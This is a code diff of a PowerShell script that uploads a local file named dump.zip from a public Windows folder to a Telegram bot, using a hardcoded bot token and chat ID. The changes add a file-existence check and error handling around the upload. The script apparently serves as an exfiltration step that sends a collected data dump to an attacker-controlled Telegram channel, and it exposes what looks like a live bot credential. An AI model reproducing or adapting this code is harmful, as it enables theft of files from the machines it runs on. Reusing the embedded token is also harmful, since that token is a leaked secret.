@@ -3,6 +3,12 @@ $botToken = "7114983794:AAGyo81srw1mdAfxNSHtggO7PvEk-au038I"
 $chatID = "7925642901"
 $filePath = "C:\Users\Public\Documents\dump.zip"
 
+# Verify the file exists
+if (-Not (Test-Path $filePath)) {
+    Write-Output "File does not exist: $filePath"
+    exit
+}
+
 # Prepare the API URL
 $apiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
 
@@ -33,17 +39,21 @@ $request.ContentType = "multipart/form-data; boundary=$boundary"
 $request.ContentLength = $body.Length
 
 # Write the body to the request stream
-$requestStream = $request.GetRequestStream()
-$writer = New-Object System.IO.StreamWriter($requestStream)
-$writer.Write($body)
-$writer.Close()
+try {
+    $requestStream = $request.GetRequestStream()
+    $writer = New-Object System.IO.StreamWriter($requestStream)
+    $writer.Write($body)
+    $writer.Close()
 
-# Get the response
-$response = $request.GetResponse()
-$responseStream = $response.GetResponseStream()
-$reader = New-Object System.IO.StreamReader($responseStream)
-$responseText = $reader.ReadToEnd()
-$reader.Close()
+    # Get the response
+    $response = $request.GetResponse()
+    $responseStream = $response.GetResponseStream()
+    $reader = New-Object System.IO.StreamReader($responseStream)
+    $responseText = $reader.ReadToEnd()
+    $reader.Close()
 
-# Output the response
-Write-Output $responseText
+    # Output the response
+    Write-Output "Upload successful! Response: $responseText"
+} catch {
+    Write-Output "Upload failed. Error: $_"
+}
